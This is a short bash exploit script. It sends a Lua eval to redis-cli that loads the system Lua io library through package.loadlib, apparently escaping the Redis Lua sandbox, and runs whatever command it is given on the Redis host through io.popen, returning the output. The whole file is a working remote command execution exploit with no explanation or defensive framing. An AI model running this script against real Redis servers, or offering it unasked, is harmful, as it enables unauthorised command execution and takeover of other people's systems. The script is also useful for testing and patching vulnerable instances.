#!/bin/bash

user_input=$1

cmd="eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"$user_input\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0"
printf "%s\n" "$cmd" | redis-cli
